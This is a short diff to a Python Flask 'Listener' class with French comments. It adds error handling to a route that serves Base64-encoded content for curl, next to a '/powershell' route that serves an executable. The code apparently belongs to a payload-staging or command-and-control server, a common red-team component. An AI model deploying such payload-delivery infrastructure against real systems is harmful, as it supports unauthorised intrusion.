@@ -230,6 +230,9 @@ class Listener():
                 # On renvoie du texte brut pour que curl ou un navigateur
                 # puisse récupérer directement la chaîne Base64.
                 return Response(encoded, status=200, mimetype='text/plain')
+            except Exception as e:
+                # En cas d’erreur (fichier manquant, permissions, etc.)
+                return Response(f"error: {e}", status=500, mimetype='text/plain')
         @self.app.route("/powershell", methods=['GET'])
         def serve_powershell():
             file_path = "/opt/powershell.exe"
